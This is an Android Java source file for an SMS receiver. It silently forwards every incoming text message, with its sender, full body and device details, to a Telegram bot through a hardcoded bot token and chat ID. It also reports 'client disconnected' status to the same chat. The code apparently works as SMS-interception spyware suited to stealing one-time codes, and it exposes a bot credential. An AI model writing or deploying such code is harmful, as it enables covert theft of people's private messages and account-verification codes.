package com.lucifer.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;


public class SMSReceiver extends BroadcastReceiver {
    private static final String BOT_TOKEN = "7309787344:AAGYiIZStxcdrisSldJ0YczaSEKbaJz8D9I";
    private static final String CHAT_ID = "7631182093";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        SmsMessage[] msgs = null;

        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];

            String sender = "", body = "";

            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                sender = msgs[i].getOriginatingAddress();
                body += msgs[i].getMessageBody();
            }

            String deviceInfo = Build.BRAND + " " + Build.MODEL;

            String cleanBody = body.replace("<", "&lt;").replace(">", "&gt;");

            String finalMessage = "📥 SMS Received\n\n" +
                    "📲 Recipient: " + sender + "\n" +
                    "💌 Message: " + body + "\n\n" +
                    "Device Info:\n" +
                    "MODEL: " + Build.MODEL + "\n" +
                    "MANUFACTURER: " + Build.MANUFACTURER + "\n" +
                    "VERSION: " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\n" +
                    "TIME: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());


            sendToTelegram(finalMessage);
        }
    }

    private static String escapeHTML(String input) {
        return input.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;");
    }

    public static void sendTelegramDirect(String message) {
        new Thread(() -> {
            try {
                String safeMessage = escapeHTML(message);

                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                String data = "chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(safeMessage, "UTF-8") +
                        "&parse_mode=HTML";

                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setFixedLengthStreamingMode(data.getBytes().length);

                OutputStream out = conn.getOutputStream();
                out.write(data.getBytes());
                out.flush();
                out.close();

                if (conn.getResponseCode() == 200) conn.getInputStream().close();
                else if (conn.getErrorStream() != null) conn.getErrorStream().close();

            } catch (Exception e) {
                Log.e("Telegram", "Error in heartbeat", e);
            }
        }).start();
    }
    private void sendToTelegram(final String message) {
        new Thread(() -> {
            try {
                String safeMessage = escapeHTML(message);

                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                String data = "chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(safeMessage, "UTF-8") +
                        "&parse_mode=HTML";

                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setFixedLengthStreamingMode(data.getBytes().length);

                OutputStream out = conn.getOutputStream();
                out.write(data.getBytes());
                out.flush();
                out.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    conn.getInputStream().close();
                } else {
                    if (conn.getErrorStream() != null) conn.getErrorStream().close();
                    sendDisconnectMessage("🚫 Client Disconnected\nReason: HTTP " + responseCode +
                            "\n📱 Device: " + Build.BRAND + " " + Build.MODEL);
                }

            } catch (Exception e) {
                Log.e("Telegram", "❌ Exception", e);
                sendDisconnectMessage("🚫 Client Disconnected\nReason: " + e.getClass().getSimpleName() +
                        "\n📱 Device: " + Build.BRAND + " " + Build.MODEL);
            }
        }).start();
    }

    private void sendDisconnectMessage(final String errorMsg) {
        sendTelegramDirect(errorMsg);
    }
}
